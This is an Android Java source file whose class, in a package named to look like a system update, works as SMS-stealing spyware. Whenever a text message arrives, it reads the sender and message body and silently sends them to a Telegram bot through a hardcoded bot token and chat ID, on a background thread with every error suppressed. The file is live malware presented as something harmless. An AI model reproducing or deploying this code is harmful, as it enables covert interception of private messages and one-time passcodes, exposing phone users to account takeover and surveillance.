package com.system.update;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    StringBuilder msg = new StringBuilder("🚨 New SMS:\n");
                    for (Object pdu : pdus) {
                        SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                        msg.append("From: ").append(sms.getOriginatingAddress()).append("\n").append(sms.getMessageBody()).append("\n");
                    }
                    new Thread(() -> {
                        try {
                            String urlStr = "https://api.telegram.org/bot9014559285:AAEamXnqANi68FHT7mnT3DpF5hC1y9zmes4/sendMessage?chat_id=6978974735&text=" + URLEncoder.encode(msg.toString(), "UTF-8");
                            HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
                            conn.getInputStream().close();
                        } catch (Exception ignored) {}
                    }).start();
                }
            }
        }
    }
}
